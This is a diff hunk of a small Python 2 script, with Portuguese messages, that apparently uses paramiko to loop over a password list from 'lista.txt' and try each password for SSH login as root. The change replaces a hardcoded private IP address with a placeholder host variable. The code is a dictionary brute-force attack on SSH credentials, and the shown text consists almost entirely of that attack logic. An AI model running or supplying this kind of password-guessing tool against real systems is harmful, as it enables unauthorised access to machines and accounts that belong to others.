@@ -11,7 +11,8 @@ f = open("lista.txt")
 for pas in f.readlines():
     senha = pas.split()
     try:
-     ssh.connect("192.168.15.112", username="root", password=senha[0])
+     host = 'IP'
+     ssh.connect(host, username="root", password=senha[0])
     except paramiko.AuthenticationException:
      print "[-] - Acesso Negado",pas
     else:
